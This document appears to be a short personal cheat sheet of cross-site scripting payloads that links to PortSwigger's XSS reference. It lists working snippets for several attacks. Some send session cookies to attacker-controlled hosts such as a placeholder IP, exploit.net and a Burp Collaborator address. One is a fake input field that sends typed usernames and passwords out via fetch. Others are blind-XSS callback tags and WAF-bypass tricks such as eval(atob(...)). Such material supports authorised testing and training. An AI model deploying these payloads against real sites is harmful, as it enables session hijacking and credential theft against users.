https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
(NodeJS) Rich objects BodyParser extended: true
```
content[key]=value -> {"key":"value"}
```
Session Hijacking
```html
<script>new Image().src="http://{attacker IP:port}/?cookie=" + encodeURI(document.cookie);</script>
```
Another payload
```html
<img src="1" onerror="window.location='https://exploit.net/cookie='+document.cookie">
```
Collab Session Hijacking
```html
<script>
fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
```
Stealing Credentials
```html
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
{ 
	method:'POST', 
	mode: 'no-cors', 
	body:username.value+':'+this.value 
});">
```
### Blind XSS
Detection
```html
<img src="https://EXPLOIT.net/img">
<script src="https://EXPLOIT.net/script"></script>
<video src="https://EXPLOIT.net/video"></video>
```
### WAF Bypass
Base64 encoded
- atob() or btoa()
- if eval blocked: setTimeout(code), setInterval(code), setImmediate(code), Function(code)()
```javascript
eval(atob(<base64_payload>))
```